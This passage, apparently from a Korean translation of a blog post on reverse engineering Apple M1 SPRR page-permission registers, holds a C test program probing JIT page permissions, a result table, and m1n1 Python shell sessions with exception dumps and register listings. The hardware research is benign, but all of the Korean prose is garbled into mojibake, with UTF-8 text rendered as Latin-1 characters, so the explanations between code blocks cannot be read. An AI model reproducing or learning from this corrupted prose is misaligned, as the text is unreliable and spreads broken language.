ë§¤í•‘í•˜ê³  ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ì— ëª¨ë“  4ê°œì˜ ê°€ëŠ¥í•œ ê°’ì„ ë©”ëª¨ë¦¬ ì½ê¸° í˜¹ì€ ì“°ê¸°ë¥¼ ì‹¤í–‰í•œë‹¤.</p><ul><li><p>SPRR JIT test code</p>  <pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _XOPEN_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/utsname.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ucontext.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sev_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc = cx-&gt;uc_mcontext-&gt;__ss.__lr;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bus_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signo, <span class="hljs-keyword">siginfo_t</span> *info, <span class="hljs-keyword">void</span> *cx_)</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)signo;    (<span class="hljs-keyword">void</span>)info;    <span class="hljs-keyword">ucontext_t</span> *cx = cx_;    cx-&gt;uc_mcontext-&gt;__ss.__x[<span class="hljs-number">0</span>] = <span class="hljs-number">0xdeadbeef</span>;    cx-&gt;uc_mcontext-&gt;__ss.__pc += <span class="hljs-number">4</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">write_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    __asm__ __volatile__(<span class="hljs-string">&quot;msr S3_6_c15_c1_5, %0\n&quot;</span>                         <span class="hljs-string">&quot;isb sy\n&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(v)                         :);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">read_sprr_perm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v;    __asm__ __volatile__(<span class="hljs-string">&quot;isb sy\n&quot;</span>                         <span class="hljs-string">&quot;mrs %0, S3_6_c15_c1_5\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)::<span class="hljs-string">&quot;memory&quot;</span>);    <span class="hljs-keyword">return</span> v;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;ldr x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> v = <span class="hljs-number">0</span>;    __asm__ __volatile__(<span class="hljs-string">&quot;str x0, [%0]\n&quot;</span>                         <span class="hljs-string">&quot;mov %0, x0\n&quot;</span>                         : <span class="hljs-string">&quot;=r&quot;</span>(v)                         : <span class="hljs-string">&quot;r&quot;</span>(ptr + <span class="hljs-number">8</span>)                         : <span class="hljs-string">&quot;memory&quot;</span>, <span class="hljs-string">&quot;x0&quot;</span>);    <span class="hljs-keyword">if</span> (v == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">can_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> (*fun_ptr)(<span class="hljs-keyword">uint64_t</span>) = ptr;    <span class="hljs-keyword">uint64_t</span> res = fun_ptr(<span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (res == <span class="hljs-number">0xdeadbeef</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sprr_test</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">uint64_t</span> v)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> a, b;    a = read_sprr_perm();    write_sprr_perm(v);    b = read_sprr_perm();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx: %c%c%c\n&quot;</span>, b, can_read(ptr) ? <span class="hljs-string">&#x27;r&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>, can_write(ptr) ? <span class="hljs-string">&#x27;w&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>,           can_exec(ptr) ? <span class="hljs-string">&#x27;x&#x27;</span> : <span class="hljs-string">&#x27;-&#x27;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-title">make_sprr_val</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> nibble)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">uint64_t</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)        res |= ((<span class="hljs-keyword">uint64_t</span>)nibble) &lt;&lt; (<span class="hljs-number">4</span> * i);    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><span class="hljs-function"></span>&#123;    (<span class="hljs-keyword">void</span>)argc;    (<span class="hljs-keyword">void</span>)argv;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span>    sigfillset(&amp;sa.sa_mask);    sa.sa_sigaction = bus_handler;    sa.sa_flags = SA_RESTART | SA_SIGINFO;    sigaction(SIGBUS, &amp;sa, <span class="hljs-number">0</span>);    sa.sa_sigaction = sev_handler;    sigaction(SIGSEGV, &amp;sa, <span class="hljs-number">0</span>);    <span class="hljs-keyword">uint32_t</span> *ptr = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);    write_sprr_perm(<span class="hljs-number">0x3333333333333333</span>);    ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0xd65f03c0</span>; <span class="hljs-comment">// ret</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i)        sprr_test(ptr, make_sprr_val(i));&#125;</code></pre></li></ul><p>ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ í…Œì´ë¸”ì´ ì£¼ì–´ì§„ë‹¤.</p><table><thead><tr><th>ë ˆì§€ìŠ¤í„° ê°’</th><th>í˜ì´ì§€ ê¶Œí•œ</th></tr></thead><tbody><tr><td>00</td><td><code>---</code></td></tr><tr><td>01</td><td><code>r-x</code></td></tr><tr><td>10</td><td><code>r--</code></td></tr><tr><td>11</td><td><code>rw-</code></td></tr></tbody></table><p>APRRì˜ ë™ì‘ ë°©ì‹ë³´ë‹¤ í›¨ì”¬ ë‹¨ìˆœí•˜ë‹¤. ë‘ ê°œì˜ ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì²« ê¶Œí•œì„ ì„¤ì •í•˜ê³  ë‹¤ë¥¸ ë ˆì§€ìŠ¤í„°ë¥¼ ë§ˆìŠ¤í‚¹í•˜ëŠ” ëŒ€ì‹ ì— 4ê°œì˜ ê°’ ì¤‘ í•˜ë‚˜ë¡œë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤. APRRì€ userspaceì— <code>rxw</code> ë§¤í•‘ì„ ìƒì„±í•  ìˆ˜ ìˆëŠ” í•´í‚¹ ë°©ë²•ì´ ì¡´ì¬í•˜ì˜€ëŠ”ë°, ì´ë¥¼ ì¸ì½”ë”©í•˜ëŠ” ë°©ë²•ì´ ì—†ìœ¼ë¯€ë¡œ ë¶ˆê°€ëŠ¥í•˜ë‹¤. ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ì˜ ë‹¤ë¥¸ ë°”ì´íŠ¸ë“¤ì€ í˜ì´ì§€ í…Œì´ë¸” ì—”íŠ¸ë¦¬ì— ì¸ì½”ë”© ëœ 16ê°œì˜ ë‹¤ë¥¸ ì‚¬ìš© ê¶Œí•œì¼ ìˆ˜ë„ ìˆë‹¤. ê·¸ëŸ¬ë©´ ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ì˜ ë‚˜ë¨¸ì§€ëŠ” ì•Œ ìˆ˜ ì—†ê² ëŠ”ê±¸</p><p>ì´ì œ ìƒˆë¡œìš´ í•˜ë“œì›¨ì–´ ê¸°ëŠ¥ì˜ ë™ì‘ ë°©ì‹ì— ëŒ€í•´ ì‚´í´ë³´ì.</p><p>ì• í”Œì˜ í•˜ì´í¼ë°”ì´ì € í”„ë ˆì„ì›Œí¬ë¥¼ ì‚¬ìš©í•˜ì—¬ EL1ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ SPRRì´ ì–´ë–»ê²Œ ë™ì‘í•˜ëŠ”ì§€ í™•ì¸í•˜ê³  ì‹¶ì—ˆì§€ë§Œ, SPRRê³¼ ì—°ê´€ëœ ë ˆì§€ìŠ¤í„°ì— ì ‘ê·¼í•˜ë©´ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆë‹¤. ëŒ€ì‹ ì— ë² ì–´ ë©”íƒˆ(bare metal)ì„ í†µí•´ EL2ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì.</p><h2 id="m1n1"><a href="#m1n1" class="headerlink" title="m1n1"></a>m1n1</h2><p>ì´ì „ ì•„ì´í° í•´ì»¤ë“¤ì€ XNUì„ ì •ì  ë¦¬ë²„ì‹± í•˜ê±°ë‚˜ exploit í•˜ê¸° ìœ„í•´ EL1ê¹Œì§€ ê°€ëŠ” ê³¼ì •ì„ ì‹¤í—˜í–ˆë‹¤. í•˜ì§€ë§Œ M1ì€ ë§ì€ í•˜ë“œì›¨ì–´ ê¸°ëŠ¥ì„ ê³µìœ í•˜ë©° ë¶€íŠ¸ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì„œëª…ë˜ì§€ ì•Šì€ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤.</p><p>M1ì— ëŒ€í•œ upstream linux ì§€ì›ì„ ëª©í‘œë¡œ í•˜ëŠ” Asahi Linux projectì˜ ì¼ë¶€ë¡œ m1n1ì´ë¼ ë¶ˆë¦¬ëŠ” ì‘ì€ ë¶€íŠ¸ë¡œë”/í•˜ë“œì›¨ì–´ í”Œë«í¼ì´ ê°œë°œë˜ì—ˆë‹¤. m1n1ì€ XNUì™€ ë™ì‹œì— ì œì–´ ê¶Œí•œì„ ê°–ëŠ”ë‹¤. ì•„ë˜ì˜ ëª¨ë“  ì‘ì—…ì€ EL2ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” shellcodeë¡œ ì‘ì„±í•  ìˆ˜ ìˆì§€ë§Œ m1n1ì„ ì‚¬ìš©í•˜ì—¬ ì§„í–‰í•œë‹¤.</p><h2 id="Pythonì—ì„œ-ì•Œ-ìˆ˜-ì—†ëŠ”-ì‹œìŠ¤í…œ-ë ˆì§€ìŠ¤í„°-ë°œê²¬"><a href="#Pythonì—ì„œ-ì•Œ-ìˆ˜-ì—†ëŠ”-ì‹œìŠ¤í…œ-ë ˆì§€ìŠ¤í„°-ë°œê²¬" class="headerlink" title="Pythonì—ì„œ ì•Œ ìˆ˜ ì—†ëŠ” ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„° ë°œê²¬"></a>Pythonì—ì„œ ì•Œ ìˆ˜ ì—†ëŠ” ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„° ë°œê²¬</h2><p>m1n1ì€ shellcodeë¥¼ ì»´íŒŒì¼í•˜ê³  ë¡œë“œí•˜ê³  ë°ì´í„° ì¶”ì¶œì„ í•¸ë“¤ë§í•˜ëŠ” ë“± ì´ëŸ¬í•œ ëª¨ë“  ì„¸ë¶€ ì‚¬í•­ì„ íŒŒì´ì¬ ì‰˜ì—ì„œ ì§ì ‘ í•˜ë“œì›¨ì–´ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤. ë˜ ìµœê·¼ í•„ìì˜ USB ê°€ì ¯ ì½”ë“œë¥¼ ë³‘í•©í•˜ì—¬ m1 MACê³¼ ì¼ë°˜ USB ì¼€ì´ë¸”ë§Œìœ¼ë¡œ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><p><code>proxyclient/shell.py</code>ë¥¼ ì‹¤í–‰í•˜ì. ìœ ì € ëœë“œ SPRR ë ˆì§€ìŠ¤í„°ì— ì ‘ê·¼í•˜ë©´ ì˜ˆì™¸ê°€ ë°œìƒí•œë‹¤.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>))TTY&gt; Exception: SYNCTTY&gt; Exception taken <span class="hljs-keyword">from</span> EL2hTTY&gt; Running <span class="hljs-keyword">in</span> EL2TTY&gt; MPIDR: <span class="hljs-number">0x80000000</span>TTY&gt; Registers: (@<span class="hljs-number">0x8046b3db0</span>)TTY&gt;   x0-x3: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span>TTY&gt;   x4-x7: <span class="hljs-number">0000000810</span>cb8000 <span class="hljs-number">0000000000007</span>a69 <span class="hljs-number">0000000804630004</span> <span class="hljs-number">0000000804630000</span>TTY&gt;  x8-x11: <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000000</span>ffffffc8 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">000000000000002</span>cTTY&gt; x12-x15: <span class="hljs-number">0000000000000003</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">00000008046</span>b3b20TTY&gt; x16-x19: <span class="hljs-number">00000008045</span>caa80 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-number">000000080462</span>b000TTY&gt; x20-x23: <span class="hljs-number">00000008046</span>b3f78 <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">0000000000000002</span> <span class="hljs-number">00000008046</span>b3f98TTY&gt; x24-x27: <span class="hljs-number">00000008046</span>b3f70 <span class="hljs-number">0000000000000000</span> <span class="hljs-number">0000000000000001</span> <span class="hljs-number">0000000000000001</span>TTY&gt; x28-x30: <span class="hljs-number">00000008046</span>b3fa0 <span class="hljs-number">00000008046</span>b3eb0 <span class="hljs-number">00000008045</span>bad90TTY&gt; PC:       <span class="hljs-number">0x810cb8000</span> (rel: <span class="hljs-number">0xc70c000</span>)TTY&gt; SP:       <span class="hljs-number">0x8046b3eb0</span>TTY&gt; SPSR_EL1: <span class="hljs-number">0x60000009</span>TTY&gt; FAR_EL1:  <span class="hljs-number">0x0</span>TTY&gt; ESR_EL1:  <span class="hljs-number">0x2000000</span> (unknown)TTY&gt; L2C_ERR_STS: <span class="hljs-number">0x11000ffc00000000</span>TTY&gt; L2C_ERR_ADR: <span class="hljs-number">0x0</span>TTY&gt; L2C_ERR_INF: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_LSU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_FED_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; SYS_APL_E_MMU_ERR_STS: <span class="hljs-number">0x0</span>TTY&gt; Recovering <span class="hljs-keyword">from</span> exception (ELR=<span class="hljs-number">0x810cb8004</span>)Traceback (most recent call last):  File <span class="hljs-string">&quot;/opt/homebrew/Cellar/python@3.9/3.9.4/Frameworks/Python.framework/Versions/3.9/lib/python3.9/code.py&quot;</span>, line <span class="hljs-number">90</span>, <span class="hljs-keyword">in</span> runcode    exec(code, self.locals)  File <span class="hljs-string">&quot;&lt;console&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;  File <span class="hljs-string">&quot;/Users/speter/asahi/git/m1n1/proxyclient/utils.py&quot;</span>, line <span class="hljs-number">80</span>, <span class="hljs-keyword">in</span> mrs    <span class="hljs-keyword">raise</span> ProxyError(<span class="hljs-string">&quot;Exception occurred&quot;</span>)proxy.ProxyError: Exception occurred&gt;&gt;&gt;</code></pre><p>ì»¤ë„ì€ ì»¨í…ìŠ¤íŠ¸ ì „í™˜ ì¤‘ì— ì´ ë ˆì§€ìŠ¤í„°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤. ì´ëŠ” enable bitê°€ ìˆìŒì„ ì˜ë¯¸í•˜ë©° m1n1 repositoryì— ì‚¬ìš© ê°€ëŠ¥í•œ ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°ë¥¼ ì°¾ëŠ” íŒŒì´ì¬ íˆ´ì´ ìˆë‹¤. ë‚´ë¶€ì ìœ¼ë¡œ ëª¨ë“  ëª…ë ¹ì— ëŒ€í•´ mrs ëª…ë ¹ì„ ìƒì„±í•˜ê³  ì •ì˜ë˜ì§€ ì•Šì€ ë ˆì§€ìŠ¤í„°ë¡œ ì´í•œ ì˜ˆì™¸ë¥¼ ë³µêµ¬í•œë‹¤. ê·¸ê²ƒì„ ì‹¤í–‰í•˜ì—¬ ê·¼ì²˜ì˜ ë ˆì§€ìŠ¤í„°ë¥¼ ì°¾ëŠ”ë‹¤.</p><pre><code class="hljs python">$ python3 proxyclient/find_all_regs.py | grep s3_6_c15_c1_s3_6_c15_c1_0 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_2 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>) = <span class="hljs-number">0x0</span>s3_6_c15_c1_4 (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>) = <span class="hljs-number">0x0</span></code></pre><p>MMUë¥¼ ë¹„í™œì„±í™”í•˜ê³  ê° ë ˆì§€ìŠ¤í„°ì— ëª¨ë“  ë ˆì§€ìŠ¤í„°ë¥¼ ì‘ì„±í•˜ê³ , ë ˆì§€ìŠ¤í„°ë¥¼ ë‹¤ì‹œ ì°¾ì•„ì„œ ìƒˆë¡œìš´ ë ˆì§€ìŠ¤í„°ë¥¼ ì‹ë³„í•œë‹¤. ì´ê²ƒì€ ëª‡ ì¤„ì˜ íŒŒì´ì¬ ì½”ë“œë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">with</span> u.mmu_disabled():    <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> [(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)]:        old_regs = find_regs()        u.msr(reg, <span class="hljs-number">1</span>)        new_regs = find_regs()        diff_regs = new_regs - old_regs        print(reg)        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(diff_regs):            print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-number">0</span>)    u.msr((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</code></pre><ul><li><p>í™œì„±í™”ëœ ì‹œìŠ¤í…œ ë ˆì§€ìŠ¤í„°</p>  <pre><code class="hljs python">(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span 